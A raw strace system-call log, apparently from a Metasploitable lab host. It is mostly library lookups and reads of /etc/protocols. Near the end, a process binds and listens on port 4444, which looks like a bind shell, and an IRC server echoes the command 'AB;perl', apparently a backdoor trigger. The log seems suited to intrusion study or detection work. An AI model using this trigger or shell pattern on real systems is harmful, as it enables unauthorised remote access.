11348 07:37:14.651734 stat64("/lib/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.651751 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.651764 stat64("/lib/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.651774 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.651786 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11348 07:37:14.651802 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.651816 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.651827 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.651840 stat64("/usr/lib/tls/i686/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.651851 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.651863 stat64("/usr/lib/tls/i686/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.651875 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.651887 stat64("/usr/lib/tls/i686", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.651898 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.651910 stat64("/usr/lib/tls/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.651921 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.651933 stat64("/usr/lib/tls/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.651944 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.651956 stat64("/usr/lib/tls/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.651967 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.651978 stat64("/usr/lib/tls", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.651989 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652002 stat64("/usr/lib/i686/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652013 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652034 stat64("/usr/lib/i686/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652048 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652088 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11348 07:37:14.652105 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652131 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11348 07:37:14.652148 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652160 stat64("/usr/lib/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652171 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652182 stat64("/usr/lib/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652193 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652205 stat64("/usr/lib/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652216 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652227 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
11348 07:37:14.652247 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652261 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652273 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652286 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652298 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652311 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652323 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652335 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652347 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652360 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652372 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652384 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652396 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652408 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652420 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652432 stat64("/lib/i486-linux-gnu/tls", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652443 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652457 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652469 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652481 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652493 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652506 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652517 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652542 stat64("/lib/i486-linux-gnu/i686", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652584 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652598 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652645 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652674 stat64("/lib/i486-linux-gnu/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652700 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652713 stat64("/lib/i486-linux-gnu/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652725 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652737 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11348 07:37:14.652788 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652822 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652873 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652919 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.652946 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.652993 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.653068 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.653083 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.653096 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.653129 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.653160 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.653208 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.653239 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.653287 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.653313 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.653344 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.653370 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.653384 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.653396 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.653410 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.653422 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.653436 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.653461 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.653474 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.653486 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.653499 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.653511 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.653531 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.653544 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.653583 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.653595 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.653622 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11348 07:37:14.653641 munmap(0xb7dcd000, 29913) = 0
11348 07:37:14.653662 open("/etc/ld.so.cache", O_RDONLY) = 6
11348 07:37:14.653674 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11348 07:37:14.653690 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7dcd000
11348 07:37:14.653701 close(6)          = 0
11348 07:37:14.653711 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11348 07:37:14.653726 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
11348 07:37:14.653743 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
11348 07:37:14.653832 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
11348 07:37:14.653853 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7dc2000
11348 07:37:14.653865 mmap2(0xb7dcb000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7dcb000
11348 07:37:14.653882 close(6)          = 0
11348 07:37:14.653905 munmap(0xb7dcd000, 29913) = 0
11348 07:37:14.653921 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
11348 07:37:14.653937 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
11348 07:37:14.653952 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
11348 07:37:14.653969 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dd4000
11348 07:37:14.653980 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
11348 07:37:14.654233 close(6)          = 0
11348 07:37:14.654244 munmap(0xb7dd4000, 4096) = 0
11348 07:37:14.654263 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
11348 07:37:14.654277 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
11348 07:37:14.654293 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dd4000
11348 07:37:14.654304 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
11348 07:37:14.654475 close(6)          = 0
11348 07:37:14.654484 munmap(0xb7dd4000, 4096) = 0
11348 07:37:14.654511 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
11348 07:37:14.654574 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb62508) = -1 EINVAL (Invalid argument)
11348 07:37:14.654608 _llseek(6, 0, 0xbfb62550, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11348 07:37:14.654621 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb62508) = -1 EINVAL (Invalid argument)
11348 07:37:14.654632 _llseek(6, 0, 0xbfb62550, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11348 07:37:14.654642 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
11348 07:37:14.654710 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
11348 07:37:14.654745 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
11348 07:37:14.654769 listen(6, 5)      = 0
11348 07:37:14.654821 accept(6,  <unfinished ...>
11347 07:37:14.659857 exit_group(0)     = ?
11345 07:37:14.659934 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 11347
11345 07:37:14.659950 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11345 07:37:14.659961 --- SIGCHLD (Child exited) @ 0 (0) ---
11345 07:37:14.659969 waitpid(-1, 0xbf9f5568, WNOHANG) = -1 ECHILD (No child processes)
11345 07:37:14.659980 sigreturn()       = ? (mask now [])
11345 07:37:14.659995 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
11345 07:37:14.660059 exit_group(0)     = ?
4519  07:37:14.660161 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 11345
4519  07:37:14.660173 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:37:14.660188 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:37:14.660199 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:37:14.660222 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:37:14.660240 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:37:14.660307 gettimeofday({1495625834, 660313}, NULL) = 0
4519  07:37:14.660342 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 760000})
4519  07:37:14.899802 clock_gettime(CLOCK_MONOTONIC, {2644, 716810844}) = 0
4519  07:37:14.899802 recv(9, "PRIVMSG  #testit3 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  07:37:14.899822 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.899842 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.899856 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.899870 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.899883 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.899897 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.899910 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.899924 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.899937 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.899950 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.899963 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.899977 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.899990 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.900003 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.900016 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.900029 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.900042 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.900055 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.900069 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.900084 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.900111 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.900155 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 470000}, ...}) = 0
4519  07:37:14.900210 time(NULL)        = 1495625834
4519  07:37:14.900220 time(NULL)        = 1495625834
4519  07:37:14.900236 gettimeofday({1495625834, 900240}, NULL) = 0
